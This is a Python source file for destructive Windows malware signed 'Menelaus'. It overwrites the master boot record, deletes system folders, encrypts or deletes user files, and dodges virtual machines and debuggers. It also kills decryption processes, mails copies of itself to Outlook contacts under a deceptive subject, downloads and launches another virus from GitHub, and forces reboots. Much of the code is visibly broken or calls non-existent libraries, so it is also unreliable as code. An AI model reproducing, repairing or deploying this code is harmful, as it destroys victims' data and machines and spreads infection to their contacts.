import os
from os import path
from os import rename
import sys
import subprocess
from subprocess import call
import requests
import time
import random
import ctypes
import platform
import psutil
import zipfile
import time
import locale
from googletrans import Translator
import json
import windsound
import win32com.client
import win32api
from win32api import *
from win32gui import *
from win32con import *
from resources.misc import *
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler


kernel32 = ctypes.WinDLL("kernel32")
kernel64 = ctypes.WinDLL("kernel64")
user32 = ctypes.WinDLL("user32")
user64 = ctypes.WinDLL("user64")
ntdll = ctypes.WinDLL("ntdll")
psapi = ctypes.WinDLL("psapi")
requests.packages.urllib3.disable_warnings()  # Disable SSL Warning
startupinfo = subprocess.STARTUPINFO()  # type: ignore
drives = win32api.GetLogicalDriveStrings()
BOOL = ctypes.c_int
DWORD = ctypes.c_ulong
LPCTSTR = ctypes.c_wchar_p
advapi32 = ctypes.windll.advapi32
advapi64 = ctypes.windll.advapi64
InitiateSystemShutdown = advapi32.InitiateSystemShutdownW
InitiateSystemShutdown64 = advapi64.InitiateSystemShutdownW
InitiateSystemShutdown.argtypes = (LPCTSTR, LPCTSTR, DWORD, BOOL, BOOL)
InitiateSystemShutdown.restype = BOOL

buffer = bytes([
    # BOOT SECTOR DATA
    # contains boot sector code and messages
    0xE8, 0x15, 0x00, 0xBB, 0x27, 0x7C, 0x8A, 0x07, 0x3C, 0x00, 0x74, 0x0B, 0xE8, 0x03, 0x00, 0x43,
    0xEB, 0xF4, 0xB4, 0x0E, 0xCD, 0x10, 0xC3, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x04, 0xB9, 0x00,
    0x00, 0xBA, 0x4F, 0x18, 0xCD, 0x10, 0xC3, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x73, 0x79, 0x73, 0x74,
    0x65, 0x6D, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20, 0x64, 0x65, 0x73, 0x74,
    0x72, 0x6F, 0x79, 0x65, 0x64, 0x21, 0x0D, 0x0A, 0x4C, 0x69, 0x6B, 0x65, 0x20, 0x26, 0x20, 0x53,
    0x75, 0x62, 0x73, 0x63, 0x72, 0x69, 0x62, 0x65, 0x21, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00] * 446 + [0x00, 0x00, 0x55, 0xAA]) # MBR signature

def run_on_all():
    try:call("bash", "./runner.sh")
    except: pass

def RunPwsh(code):
    p = subprocess.run(['powershell', code], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    return p.stdout.decode()

def get_system_info():
    info = {}
    platform_info = {
        'hostname': platform.node(),
        'os': platform.system(),
        'os_release': platform.release(),
        'os_version': platform.version(),
        'machine': platform.machine(),
        'os_build_type': platform.architecture()[0],
        'system_boot_time': psutil.boot_time(),
        'system_manufacturer': platform.system(),
        'processor': platform.processor(),
    }
    info['platform'] = platform_info

    cpu_info = {
        'cpu_percent': psutil.cpu_percent(),
        'cpu_count': psutil.cpu_count(),
        'cpu_freq': psutil.cpu_freq(),
        'cpu_times': psutil.cpu_times(),
    }
    info['cpu'] = cpu_info

    memory_info = {
        'total': psutil.virtual_memory().total,
        'available': psutil.virtual_memory().available,
        'used': psutil.virtual_memory().used,
        'free': psutil.virtual_memory().free,
        'active': psutil.virtual_memory().active,
        'inactive': psutil.virtual_memory().inactive,
        'buffers': psutil.virtual_memory().buffers,
        'cached': psutil.virtual_memory().cached,
        'shared': psutil.virtual_memory().shared,
        'slab': psutil.virtual_memory().slab,
    }
    info['memory'] = memory_info

    disk_info = {
        'total': psutil.disk_usage('/').total,
        'used': psutil.disk_usage('/').used,
        'free': psutil.disk_usage('/').free,
        'percent': psutil.disk_usage('/').percent,
    }
    info['disk'] = disk_info

    network_info = {
        'bytes_sent': psutil.net_io_counters().bytes_sent,
        'bytes_recv': psutil.net_io_counters().bytes_recv,
        'packets_sent': psutil.net_io_counters().packets_sent,
        'packets_recv': psutil.net_io_counters().packets_recv,
        'errin': psutil.net_io_counters().errin,
        'errout': psutil.net_io_counters().errout,
        'dropin': psutil.net_io_counters().dropin,
        'dropout': psutil.net_io_counters().dropout,
    }
    info['network'] = network_info

    locale_info = {
        'preferred_encoding': locale.getpreferredencoding(),
        'timezones': time.tzname,
    }
    info['locale'] = locale_info

    return json.dumps(info)

def IsAdmin():
    """Check if the current process has administrative privileges."""
    admin_sid = ctypes.windll.shell32.AdministratorsSid
    is_admin = ctypes.wintypes.BOOL()
    ctypes.windll.advapi32.CheckTokenMembership(None, ctypes.byref(admin_sid), ctypes.byref(is_admin))
    return bool(is_admin)


def RunAsAdmin():
    """Relaunch the script with administrative privileges."""
    if not IsAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

def Is64Bit():
    """Check if the operating system is 64-bit."""
    return platform.machine().endswith('64')

def IsOnline():
    """Check if the system is online."""
    try:
        x = requests.get('https://google.com', verify=False)
        return True
    except:
        return False

def IsPythonInstalled():
    return bool(os.path.exists("C:\\Python39"))

def InstallPython():
    if not IsPythonInstalled():
        architecture = "amd64" if platform.machine().endswith('64') else "x86"
        python_version = "3.8.1"
        url = f"https://www.python.org/ftp/python/{python_version}/python-{python_version}-{architecture}.exe"
        random_generator = random.randrange(111, 9999999)
        temp_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\{random_generator}.exe"
        subprocess.run(["powershell", "-Command", f"Start-BitsTransfer -Source {url} -Destination {temp_path}"])
        time.sleep(10) 
        if os.path.exists(temp_path):
            subprocess.run([temp_path, "/quiet", "InstallAllUsers=0", "Include_launcher=0", "PrependPath=1", "Include_test=0"])
            os.remove(temp_path)

def IsVirtualized():
    """Check if the system is running in a virtualized environment."""
    result = False
    
    # Check for common virtualization artifacts
    virtual_machines = [
        "VMware", "VirtualBox", "QEMU", "Xen", "KVM", "Hyper-V", "Virtual PC", "Parallels"
    ]
    for vm in virtual_machines:
        if vm in platform.platform():
            result = True
            break
    
    # Check for CPUID Hypervisor bit
    if not result:
        try:
            # Execute CPUID instruction to check Hypervisor bit
            eax, ebx, ecx, edx = ctypes.windll.kernel32.__cpuid(1)
            if (ecx >> 31) & 1:
                result = True
        except:
            pass   
     
    known_registry_keys = [
        r"SOFTWARE\Oracle\VirtualBox",
        r"SOFTWARE\VMware, Inc.\VMware Tools",
        r"SYSTEM\ControlSet001\Services\VBoxGuest",
    ]
    if not result:
        try:
            for key in known_registry_keys:
                subprocess.check_output(["reg", "query", key], stderr=subprocess.DEVNULL)
                result = True
                break
        except subprocess.CalledProcessError:
            pass    
    return result

def AntiVM():
    if IsVirtualized():
        return CommitSuicide()
    return False

def OverWriteMBR(): 
    hDevice = CreateFileW(r"\\.\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, 0)
    bytes_written = WriteFileW(hDevice, buffer, None)
    GlobalMemoryStatus(bytes_written)
    CloseHandle(hDevice) # Close the handle to our Physical Drive!

def DeleteFiles(file_paths):
    if file_paths is None:
        file_paths = ["C:\\Windows\\System32", "C:\\Windows\\SysWOW64", os.environ['SystemRoot']]
    kernel32 = ctypes.WinDLL('kernel32')
    success = True
    for file_path in file_paths:
        if kernel32.DeleteFileW(file_path):
            print(f"Deleted file: {file_path}")
        else:
            print(f"Failed to delete file: {file_path}")
            success = False
    return success


def SetFiles():
    name = path.basename(__file__)
    extension = [
        ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv", ".d3dbsp", ".sc2save", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb",
        ".pkpass", ".bc6", ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg", ".hkdb", ".tax",
        ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", ".itm", ".sb", ".fos", ".mcgame", ".vdf", ".ztmp", ".sis", ".sid", ".ncf",
        ".menu", ".layout", ".dmp", ".blob", ".esm", ".001", ".vtf", ".dazip", ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x",
        ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0",
        ".DayZProfile", ".rofl", ".hkx", ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav",
        ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".big", ".unity3d", ".wotreplay", ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css",
        ".rb", ".png", ".jpeg", ".txt", ".p7c",".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d",
        ".rw2", ".rwl", ".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2", ".crw", ".bay", ".sr2", ".srf", ".arw",
        ".3fr", ".dng", ".jpe", ".jpg", ".cdr", ".indd", ".ai", ".eps", ".pdf", ".pdd",".psd", ".dbfv", ".mdf", ".wb2", ".rtf", ".wpd", ".dxg",
        ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm",".xlsx", ".xls", ".wps", ".docm", ".docx",
        ".doc", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt"
    ]
    for root, dirpath, files in os.walk(f"C:\\Users\\{os.getlogin()}\\{os.getcwd()}"): 
        for file in files:
            if file.endswith(tuple(ext)): 
                file_path = root + "\\" + file and os.path.join(dirpath, file)
                ext = path.splitext(root + "\\" + file)[1]
                if DeleteFiles(file_path):
                    print(f"[+] Successfully deleted: {file_path}")
                else:
                    print(f"[-] Failed to delete: {file_path}")
                if ext in extension:
                    try:
                        with open(file_path, "rb") as of:
                            original: bytes = of.read()
                            encrypted = file.encrypt(original)
                        with open(file_path, "wb") as of:
                            of.write(encrypted)
                        filename = file.encrypt(file.encode())
                        new_path: str = root + "\\" + filename.decode()
                        rename(file_path, new_path)
                    except:
                        pass

def message():
    ctypes.windll.user32.MessageBoxW(
        "All of your important files have been encrypted or deleted. You don't need to send any money!\n",
        "Chill out! We are not such assholes :) However, yes - you have been hacked! :/\n",
        "This computer will be infected forever! Sorry...\n",
        "- Menelaus",
        MB_ICONWARNING
    )

def beeps():
    windsound.Beep(10000, 500)
    windsound.MessageBeep(MB_ICONWARNING)
    time.sleep(3)
    windsound.MessageBeep(MB_ICONERROR)
    time.sleep(4)
    windsound.MessageBeep(MB_ICONEXCLAMATION)
    windsound.MessageBeep(MB_ICONEXCLAMATION)
    windsound.MessageBeep(MB_ICONEXCLAMATION)
    windsound.MessageBeep(MB_ICONEXCLAMATION)
    time.sleep(3)
    windsound.MessageBeep(MB_ICONEXCLAMATION)
    windsound.MessageBeep(MB_ICONEXCLAMATION)
    windsound.MessageBeep(MB_ICONEXCLAMATION)
    windsound.MessageBeep(MB_ICONEXCLAMATION)
    windsound.MessageBeep(MB_ICONEXCLAMATION)
    time.sleep(2)
    windsound.MessageBeep(MB_ICONEXCLAMATION)
    windsound.MessageBeep(MB_ICONEXCLAMATION)
    windsound.MessageBeep(MB_ICONEXCLAMATION)
    windsound.MessageBeep(MB_ICONEXCLAMATION)
    windsound.MessageBeep(MB_ICONEXCLAMATION)
    windsound.MessageBeep(MB_ICONEXCLAMATION)

def AntiDebug():
    result = False
    try:
        # Check if a debugger is present in the current process
        kernel32 = ctypes.WinDLL('kernel32')
        if kernel32.IsDebuggerPresent():
            result = True
        
        # Check if the current process is being debugged
        is_debugged = ctypes.c_int(0)
        kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(is_debugged))
        if is_debugged.value != 0:
            result = True
        
        if ctypes.windll.kernel32.GetTickCount() < 0x1000:
            result = True
        if kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32"), "Beep") == 0:
            result = True        
    except Exception as e:
        # Handle exceptions if any
        print(f"Exception: {str(e)}.")
    
    return result

#code for more malicious intented actions!
MONITORED_DIR = "C:\\Windows\\System32"
DECRYPTION_EXTENSIONS = {".py", ".pem"}
class DecryptEventHandler(FileSystemEventHandler):
    def on_created(self, event):
        if event.is_directory:
            return
        if any(event.src_path.endswith(ext) for ext in DECRYPTION_EXTENSIONS):
            parent_pid = os.getppid()
            parent_process = psutil.Process(parent_pid)
            parent_process.terminate()
            parent_process.kill()
            print(f"[+] Suspicious decrypting activity detected. Terminated: {parent_pid}.")

def monitor_dir(directory):
    event_handler = DecryptEventHandler()
    ob = Observer()
    for dir in directory:
        ob.schedule(event_handler, dir, recursive=True)
    ob.start()
    try:
        while True:
            time.sleep(1)
            check_newer_proc()
    except KeyboardInterrupt:
        ob.stop()
    ob.join()

def check_newer_proc():
    current = set(psutil.pids())
    time.sleep(1.75)
    new_procs = set(psutil.pids()) - current
    if new_procs.start():
        for pid in new_procs:
            proc = psutil.Process(pid)
        if is_suspicious(proc):
            proc.kill()
            print(f"[+] Suspect process detected. Killing: {pid}.")

def is_suspicious(process):
    if process.name().endswith(DECRYPTION_EXTENSIONS):
        cmdLine = process.cmdLine()
        if any("decrypt" in arg.lower() for arg in cmdLine):
            return True
    return False

def replicate():
    try:
        with open(sys.argv[0], 'r') as script_file:
            script_content = script_file.read()
        with open('menelaus2.py', 'w') as replica_file:
            replica_file.write(script_content)
            print(f"[+] Script replicated successfully!")
        if replica_file.write(script_content):
            subprocess.run(['pyinstaller' '--onefile' 'menelaus.exe'])
    except Exception as e:
        print(f"[-] Script could not replicate itself - {str(e)}")

def open_notepad():
    try:
        if not RunAsAdmin():
            pass
        else:
            subprocess.Popen(['notepad.exe'])
            return True
    except Exception as e:
        print(f"Error rose up - {str(e)}")
        return False

def wait_4_process(process_name, timeout=10):
    start = time.time()
    while time.time() - start < timeout:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.memory_info(['name']) == process_name:
                return True
        time.sleep(2)
    return False

def get_random_contact():
    try:
        outlook = win32com.client.Dispatch("Outlook.Application")
        namespace = outlook.GetNameSpace("MAPI")
        inbox = namespace.GetDefaultFolder(6)
        items = inbox.Items
        contacts = [item for item in items if item.Class == 40]
        if contacts:
            random_contact = random.choice(contacts)
            return random_contact
        else:
            print("No contacts found in inbox")
            return None
    except Exception as e:
        print(f"[-] Error occurred to retrieve random e-mail")
        return None
    
def detect_language(text):
    translator = Translator()
    result = translator.detect(text)
    return result.language

def translate_text(text, target_lang):
    translator = Translator()
    translation = translator.translate(text, dest=target_lang)
    return translation

def send_replica_thru_email(attachment='menelaus2.py'):
    try:
        outlook = win32com.client.Dispatch("Outlook.Application")
        namespace = outlook.GetNameSpace("MAPI")
        email = outlook.CreateItem(0)
        random_contact = get_random_contact()
        inbox = namespace.GetDefaultFolder(6)
        to_be_scanned_emails = inbox.Items
        if random_contact:
            to = random_contact.Email1Address()
            subject = "What's wrong with you?"
            body = f"Hi {random_contact.FullName},\nI'm sure that you will find THIS amusing!\nI don't think you should be doing this, however who cares about my opinion? You're making a fool out of yourself. What is actually going on?\n\nI'm speechless..."
            email.To = to
            email.Subject = subject
            email.Body = body
            if os.path.exists(attachment):
                email.Attachments.Add(attachment)
            else:
                print(f"[!] Attachment '{attachment}' not found. Email will be sent without attachment.")
            orig_lang = detect_language(body)
            print(f"[.] Detected language: {orig_lang}")
            for email in to_be_scanned_emails:
                class_ = 43 # representing email item
                if email.Class == class_:
                    email_lang = detect_language(email.Body)
            if email_lang != 'en':
                trans_body = translate_text(email.Body, email_lang)
                print(f"[.] Translated body: {trans_body}")
            email.Send()
            email.Move(namespace.GetDefaultFolder(5))
            print("[+] Email sent successfully!")
            return True
        else:
            print("[-] No random contact found. Email not sent.")
            return False
    except Exception as e:
        print(f"[-] Error accessing Outlook, e-mail not sent due to: {str(e)}.")
        return False
    
def more_damage(url='https://codeload.github.com/thepiminer/r3ktvirus/zip/refs/heads/master', destination='./extracted', directory='C:/Windows/Downloads/r3ktvirus-master'):
    while True:
        try:
            RunAsAdmin()
            if RunAsAdmin():
                response = requests.get(url)
                time.sleep(2)
                with open('temp.zip', 'wb') as f:
                    f.write(response.content)
                with zipfile.ZipFile('temp.zip', 'r') as zip_ref:
                    zip_ref.extractall(destination)
                os.remove('temp.zip')
                time.sleep(1)
                os.chdir(directory)
                command1 = f'Expand-Archive -File r3kt_virus.zip -DestinationPath {directory}'
                subprocess.Popen(
                    command1, 
                    stdin=subprocess.PIPE, 
                    stdout=subprocess.PIPE, 
                    creationflags=subprocess.DETACHED_PROCESS, 
                    stderr=subprocess.PIPE, 
                    shell=True)
                time.sleep(1.5)
                subprocess.Popen(
                    'R3KT.exe',
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    creationflags=subprocess.DETACHED_PROCESS,
                    close_fds=True,
                    shell=False
                )
        except Exception as e:
            print(f"[-] Error while downloading more file - {str(e)}")
        
def init_damage_(destination="./extracted"):
    subprocess.run(['start' 'cmd'], check=True)
    time.sleep(1)
    more_damage()

def CommitSuicide():
    """Delete the current script file and overwrite the containing folder."""
    file_path = os.path.abspath(__file__) 
    os.remove(file_path)
    folder_path = os.path.dirname(file_path) 
    os.system("cipher /W:%s" % folder_path)   # At the end of the script, the file is deleted & over-written

def SysDown(message="Shutting down", timeout_seconds=30, force=False, reboot=False):
    lpMachineName = None
    lpMessage = message
    dwTimeout = timeout_seconds
    bForceAppsClosed = force
    bRebootAfterShutdown = reboot
    
    result = InitiateSystemShutdown(lpMachineName, lpMessage, dwTimeout, bForceAppsClosed, bRebootAfterShutdown)
    if result == 0:
        raise ctypes.WinError()

def InitiateSystemShutdown(lpMachineName, lpMessage, dwTimeout, bForceAppsClosed, bRebootAfterShutdown):
    if platform.system() == 'Windows':
        advapi32 = ctypes.windll.advapi32
        advapi64 = ctypes.windll.advapi64
        if platform.machine().endswith('64'):
            InitiateSystemShutdown = advapi64.InitiateSystemShutdownW
        else:
            InitiateSystemShutdown = advapi32.InitiateSystemShutdownW
        InitiateSystemShutdown.argtypes = (ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_int, ctypes.c_int)
        InitiateSystemShutdown.restype = ctypes.c_int
        return InitiateSystemShutdown(lpMachineName, lpMessage, dwTimeout, bForceAppsClosed, bRebootAfterShutdown)
    else:
        return -1



def main():
    global application_path
    while True:
        monitor_dir(MONITORED_DIR)
        if getattr(sys, 'frozen', False):
            application_path = sys.executable
        else:
            application_path = os.path.dirname(os.path.abspath(__file__))
    
        if not IsPythonInstalled():
            try:
                InstallPython()
                subprocess.run(["python", "-m", "pip", "install", "--upgrade", "pip"])
                subprocess.run(["python", "-m", "pip", "install", "pyinstaller"])
            except Exception as e:
                pass
        RunAsAdmin()
        try:
            call(open_notepad())
            if open_notepad():
                print("[+] Notepad opened successfully!")
            
                if wait_4_process():
                    print("[+] Notepad visible on screen")
                else:
                    pass
                    print("[!] Time out for process!")
            else:
                pass
                print("[-] Failed to open Notepad")
                try:
                    subprocess.run("powershell", "code.ps1")
                    time.sleep(2)
                    init_damage_()
                    OverWriteMBR()
                except Exception as e:
                    print(e)
        except Exception as e:
            print(f"[-] Error - {e}")
        if not IsOnline():
            CommitSuicide()
        AntiVM()
        SetFiles()
        time.sleep(3)
        message()
        beeps()
        replicate()
        OverWriteMBR()
        if replicate():
            try:
                call(send_replica_thru_email())
                if send_replica_thru_email():
                    print("[Ongoing %] Deleting sent email from Sent folder...")
                else:
                    pass
            except Exception as e:
                print(f"[!] Error accessing e-mail functions - {str(e)}")
        DeleteFiles()
        SysDown(timeout_seconds=5, force=True, reboot=True)
        OverWriteMBR()

if __name__ == '__main__':
    main()